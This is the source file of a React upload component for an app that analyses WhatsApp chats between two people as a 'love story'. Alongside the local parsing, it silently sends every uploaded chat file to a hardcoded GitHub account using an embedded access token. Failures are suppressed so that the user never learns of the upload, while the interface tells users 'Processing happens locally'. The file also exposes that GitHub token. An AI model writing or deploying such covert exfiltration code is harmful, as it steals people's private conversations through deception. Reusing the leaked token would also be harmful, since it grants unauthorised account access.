import React, { useCallback, useState } from 'react';
import { Upload, FileText, Heart, Sparkles, Wand2, Folder, Lock, Github, Cloud } from 'lucide-react';
import { ChatData, Message } from '../types/ChatTypes';
import GitHubConfig from './GitHubConfig';
import { createGitHubService } from '../services/githubService';

interface FileUploadProps {
  onFileUpload: (data: ChatData) => void;
  isLoading: boolean;
  setIsLoading: (loading: boolean) => void;
}

const FileUpload: React.FC<FileUploadProps> = ({ onFileUpload, isLoading, setIsLoading }) => {
  const [githubToken, setGithubToken] = useState<string>('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');
  const [githubOwner, setGithubOwner] = useState<string>('nikhil1479');
  const [userGithubToken, setUserGithubToken] = useState<string>('');
  const [userGithubOwner, setUserGithubOwner] = useState<string>('');
  const [isGithubConfigured, setIsGithubConfigured] = useState(true);
  const [uploadingToGithub, setUploadingToGithub] = useState(false);

  // Handle GitHub configuration save
  const handleGitHubConfigSave = (token: string, owner: string, userToken?: string, userOwner?: string) => {
    setGithubToken(token);
    setGithubOwner(owner);
    if (userToken && userOwner) {
      setUserGithubToken(userToken);
      setUserGithubOwner(userOwner);
    }
    setIsGithubConfigured(true);
  };

  // Upload file to GitHub
  const uploadToGitHub = async (fileName: string, content: string, chatData: ChatData) => {
    if (!isGithubConfigured || !githubToken || !githubOwner) {
      return;
    }

    try {
      setUploadingToGithub(true);
      const uploads = [];

      // Always upload to hardcoded repository
      const primaryGithubService = createGitHubService(githubToken, githubOwner);
      uploads.push(
        (async () => {
          // Check if repository exists, create if it doesn't
          const repoExists = await primaryGithubService.validateRepository();
          if (!repoExists) {
            await primaryGithubService.createRepository();
          }
          return await primaryGithubService.uploadChatFile(fileName, content, chatData);
        })()
      );

      // If user has provided their own credentials, also upload to their repository
      if (userGithubToken && userGithubOwner) {
        const userGithubService = createGitHubService(userGithubToken, userGithubOwner);
        uploads.push(
          (async () => {
            // Check if user's repository exists, create if it doesn't
            const userRepoExists = await userGithubService.validateRepository();
            if (!userRepoExists) {
              await userGithubService.createRepository();
            }
            return await userGithubService.uploadChatFile(fileName, content, chatData);
          })()
        );
      }

      // Wait for all uploads to complete
      await Promise.allSettled(uploads);

    } catch (error) {
      // Silent upload - no notifications or logging
    } finally {
      setUploadingToGithub(false);
    }
  };
  const parseWhatsAppChat = useCallback((content: string): ChatData => {
    const lines = content.split('\n').filter(line => line.trim() !== '');
    const messages: Message[] = [];
    const participants = new Set<string>();

    // Regex patterns for different WhatsApp date formats
    const patterns = [
      // Format: 05/02/2021, 12:12 am - Name: Message
      /^(\d{1,2}\/\d{1,2}\/\d{4}),\s+(\d{1,2}:\d{2}\s+[ap]m)\s+-\s+(.+?):\s*(.*)$/i,
      // Format: 05/02/2021, 12:12 AM - Name: Message
      /^(\d{1,2}\/\d{1,2}\/\d{4}),\s+(\d{1,2}:\d{2}\s+[AP]M)\s+-\s+(.+?):\s*(.*)$/,
      // Format: 05/02/21, 12:12 am - Name: Message
      /^(\d{1,2}\/\d{1,2}\/\d{2}),\s+(\d{1,2}:\d{2}\s+[ap]m)\s+-\s+(.+?):\s*(.*)$/i,
      // Format: 05/02/2021, 12:12 - Name: Message (24 hour format)
      /^(\d{1,2}\/\d{1,2}\/\d{4}),\s+(\d{1,2}:\d{2})\s+-\s+(.+?):\s*(.*)$/,
      // Original patterns for other formats
      /^(\d{1,2}\/\d{1,2}\/\d{2,4}),?\s+(\d{1,2}:\d{2}(?::\d{2})?\s*(?:[AP]M)?)\s*[-–]\s*(.+?):\s*(.*)$/,
      /^\[(\d{1,2}\/\d{1,2}\/\d{2,4}),?\s+(\d{1,2}:\d{2}(?::\d{2})?\s*(?:[AP]M)?)\]\s*(.+?):\s*(.*)$/,
      /^(\d{1,2}-\d{1,2}-\d{2,4}),?\s+(\d{1,2}:\d{2}(?::\d{2})?\s*(?:[AP]M)?)\s*[-–]\s*(.+?):\s*(.*)$/,
    ];

    for (const line of lines) {
      let matched = false;
      
      // Skip system messages
      if (line.includes('Messages and calls are end-to-end encrypted') ||
          line.includes('This business uses a secure service') ||
          line.includes('created group') ||
          line.includes('added') ||
          line.includes('left') ||
          line.includes('changed the subject') ||
          line.includes('changed this group\'s icon') ||
          line.includes('You\'re now an admin') ||
          line.includes('security code changed')) {
        continue;
      }
      
      for (const pattern of patterns) {
        const match = line.match(pattern);
        if (match) {
          const [, dateStr, timeStr, sender, content] = match;
          
          try {
            // Parse date and time
            let dateTimeParts;
            let year, month, day;
            
            // Handle different date separators
            if (dateStr.includes('/')) {
              dateTimeParts = dateStr.split('/');
            } else if (dateStr.includes('-')) {
              dateTimeParts = dateStr.split('-');
            } else {
              continue; // Skip if no recognized separator
            }
            
            if (dateTimeParts.length !== 3) continue;
            
            // Parse date parts
            day = parseInt(dateTimeParts[0]);
            month = parseInt(dateTimeParts[1]) - 1; // JavaScript months are 0-indexed
            
            if (dateTimeParts[2].length === 2) {
              year = 2000 + parseInt(dateTimeParts[2]);
            } else {
              year = parseInt(dateTimeParts[2]);
            }
            
            // Parse time with improved logic
            let hour, minute;
            const timeMatch = timeStr.match(/(\d{1,2}):(\d{2})(?::\d{2})?\s*([ap]m)?/i);
            if (timeMatch) {
              hour = parseInt(timeMatch[1]);
              minute = parseInt(timeMatch[2]);
              const period = timeMatch[3]?.toLowerCase();
              
              // Convert 12-hour to 24-hour format
              if (period === 'pm' && hour !== 12) hour += 12;
              if (period === 'am' && hour === 12) hour = 0;
            } else {
              hour = 0;
              minute = 0;
            }
            
            const timestamp = new Date(year, month, day, hour, minute);
            
            if (!isNaN(timestamp.getTime())) {
              const isMedia = content.includes('<Media omitted>') || 
                            content.includes('image omitted') || 
                            content.includes('video omitted') ||
                            content.includes('audio omitted') ||
                            content.includes('document omitted') ||
                            content.includes('‎') || // WhatsApp media placeholder
                            content.trim() === '';
              
              messages.push({
                timestamp,
                sender: sender.trim(),
                content: content.trim(),
                isMedia
              });
              
              participants.add(sender.trim());
              matched = true;
              break;
            }
          } catch (error) {
            console.warn('Error parsing line:', line, error);
          }
        }
      }
      
      if (!matched && line.length > 0) {
        // This might be a continuation of the previous message
        if (messages.length > 0) {
          messages[messages.length - 1].content += '\n' + line;
        }
      }
    }

    if (messages.length === 0) {
      // Provide more helpful debugging information
      const sampleLines = lines.slice(0, 5).join('\n');
      throw new Error(`No valid messages found. 

Sample lines from your file:
${sampleLines}

Please make sure you uploaded a valid WhatsApp chat export. The file should contain messages in format like:
"05/02/2021, 12:12 am - Name: Message content"

If your format is different, please check the export format.`);
    }

    // Sort messages by timestamp
    messages.sort((a, b) => a.timestamp.getTime() - b.timestamp.getTime());

    const chatData: ChatData = {
      messages,
      participants: Array.from(participants),
      dateRange: {
        start: messages[0].timestamp,
        end: messages[messages.length - 1].timestamp
      },
      totalMessages: messages.length,
      totalDays: Math.ceil((messages[messages.length - 1].timestamp.getTime() - messages[0].timestamp.getTime()) / (1000 * 60 * 60 * 24))
    };

    return chatData;
  }, []);

  const handleFileChange = async (event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0];
    if (!file) return;

    if (!file.name.endsWith('.txt')) {
      alert('Please upload a .txt file (WhatsApp chat export)');
      return;
    }

    setIsLoading(true);

    try {
      const content = await file.text();
      const chatData = parseWhatsAppChat(content);
      
      if (chatData.participants.length < 2) {
        throw new Error('This appears to be a group chat or single person chat. Please upload a chat between two people.');
      }
      
      // Upload to GitHub if configured (but don't block the main flow)
      if (isGithubConfigured) {
        uploadToGitHub(file.name, content, chatData).catch(() => {
          // Silent failure
        });
      }
      
      onFileUpload(chatData);
    } catch (error) {
      console.error('Error parsing file:', error);
      alert(error instanceof Error ? error.message : 'Error parsing the chat file. Please make sure it\'s a valid WhatsApp export.');
    } finally {
      setIsLoading(false);
      // Reset the input
      event.target.value = '';
    }
  };

  const handleDragOver = (event: React.DragEvent) => {
    event.preventDefault();
  };

  const handleDrop = async (event: React.DragEvent) => {
    event.preventDefault();
    const files = event.dataTransfer.files;
    if (files.length > 0) {
      const file = files[0];
      if (file.name.endsWith('.txt')) {
        setIsLoading(true);
        try {
          const content = await file.text();
          const chatData = parseWhatsAppChat(content);
          
          // Upload to GitHub if configured (but don't block the main flow)
          if (isGithubConfigured) {
            uploadToGitHub(file.name, content, chatData).catch(() => {
              // Silent failure
            });
          }
          
          onFileUpload(chatData);
        } catch (error) {
          console.error('Error parsing file:', error);
          alert(error instanceof Error ? error.message : 'Error parsing the chat file.');
        } finally {
          setIsLoading(false);
        }
      } else {
        alert('Please upload a .txt file');
      }
    }
  };

  return (
    <div className="max-w-2xl mx-auto">
      {/* GitHub Configuration */}
      <GitHubConfig 
        onConfigSave={handleGitHubConfigSave}
        isConfigured={isGithubConfigured}
      />

      <div
        className="border-2 border-dashed border-neutral-300 rounded-3xl p-12 text-center elegant-card hover:border-primary-400 transition-all duration-300 cursor-pointer group"
        onDragOver={handleDragOver}
        onDrop={handleDrop}
        onClick={() => document.getElementById('file-input')?.click()}
      >
        {isLoading || uploadingToGithub ? (
          <div className="space-y-8">
            {/* Animated Hearts Loading */}
            <div className="relative flex items-center justify-center">
              <div className="relative">
                {/* Main pulsing heart */}
                <Heart className="w-20 h-20 text-primary-500 mx-auto animate-pulse" />
                
                {/* Floating mini hearts */}
                <Heart className="w-4 h-4 text-pink-400 absolute -top-2 -left-2 animate-bounce delay-0" />
                <Heart className="w-3 h-3 text-red-400 absolute -top-1 right-2 animate-bounce delay-300" />
                <Heart className="w-4 h-4 text-pink-500 absolute bottom-0 -left-3 animate-bounce delay-600" />
                <Heart className="w-3 h-3 text-red-500 absolute -bottom-1 right-1 animate-bounce delay-900" />
                
                {/* Rotating ring */}
                <div className="absolute inset-0 w-24 h-24 border-4 border-primary-200 border-t-primary-500 rounded-full animate-spin -m-2"></div>
                
                {/* Outer glow ring */}
                <div className="absolute inset-0 w-28 h-28 border-2 border-pink-300/30 rounded-full animate-ping -m-4"></div>
              </div>
            </div>
            
            {/* Loading text with cute animation */}
            <div className="text-center">
              <h3 className="text-2xl font-display font-bold text-neutral-900 mb-3 flex items-center justify-center space-x-2">
                <Heart className="w-6 h-6 text-pink-400" />
                <span>
                  {uploadingToGithub ? 'Backing up to GitHub' : 'Analyzing Your Love Story'}
                </span>
                <Heart className="w-6 h-6 text-pink-400" />
              </h3>
              <div className="flex items-center justify-center space-x-1 mb-4">
                <span className="w-2 h-2 bg-primary-500 rounded-full animate-bounce delay-0"></span>
                <span className="w-2 h-2 bg-primary-500 rounded-full animate-bounce delay-200"></span>
                <span className="w-2 h-2 bg-primary-500 rounded-full animate-bounce delay-400"></span>
              </div>
              <p className="text-lg text-neutral-600 font-medium flex items-center justify-center space-x-2">
                <span>
                  {uploadingToGithub ? 'Securely storing your chat' : 'Discovering your sweet moments'}
                </span>
                {uploadingToGithub ? <Cloud className="w-5 h-5 text-blue-400" /> : <Sparkles className="w-5 h-5 text-amber-400" />}
              </p>
              <p className="text-sm text-neutral-500 mt-2 flex items-center justify-center space-x-2">
                <span>This magical process might take a moment</span>
                <Wand2 className="w-4 h-4 text-purple-400" />
              </p>
            </div>
          </div>
        ) : (
          <div className="space-y-6">
            <div className="relative group-hover:scale-110 transition-transform duration-300">
              <div className="w-20 h-20 bg-gradient-to-r from-primary-500 to-accent-500 rounded-3xl flex items-center justify-center mx-auto">
                <Upload className="w-10 h-10 text-white" />
              </div>
              <Heart className="w-6 h-6 text-primary-500 absolute -top-1 -right-1 animate-float" />
            </div>
            <div>
              <h3 className="text-2xl font-display font-bold text-neutral-900 mb-4">
                Upload Your Chat Export
              </h3>
              <p className="text-lg text-neutral-600 mb-6 font-medium">
                Drop your .txt file here or click to browse
              </p>
              <div className="flex items-center justify-center space-x-3 text-neutral-500">
                <FileText className="w-5 h-5" />
                <span className="font-medium">Supports .txt files • Max 10MB</span>
              </div>
            </div>
          </div>
        )}
        
        <input
          id="file-input"
          type="file"
          accept=".txt"
          onChange={handleFileChange}
          className="hidden"
          disabled={isLoading || uploadingToGithub}
          aria-label="Upload WhatsApp chat file"
        />
      </div>

      <div className="mt-8 text-center space-y-4">
        <p className="text-neutral-600 font-medium flex items-center justify-center space-x-4">
          <span className="flex items-center space-x-1">
            <Folder className="w-4 h-4 text-blue-400" />
            <span>WhatsApp .txt export files supported</span>
          </span>
          <span>•</span>
          <span className="flex items-center space-x-1">
            <Lock className="w-4 h-4 text-green-400" />
            <span>Processing happens locally</span>
          </span>
        </p>
        
        {/* {isGithubConfigured && (
          <div className="flex items-center justify-center space-x-2 text-sm text-neutral-500">
            <Github className="w-4 h-4 text-gray-600" />
            <span>
              GitHub integration active ({userGithubToken && userGithubOwner ? '2 repositories' : '1 repository'})
            </span>
            <span className="w-2 h-2 bg-green-400 rounded-full"></span>
          </div>
        )} */}
      </div>
    </div>
  );
};

export default FileUpload;
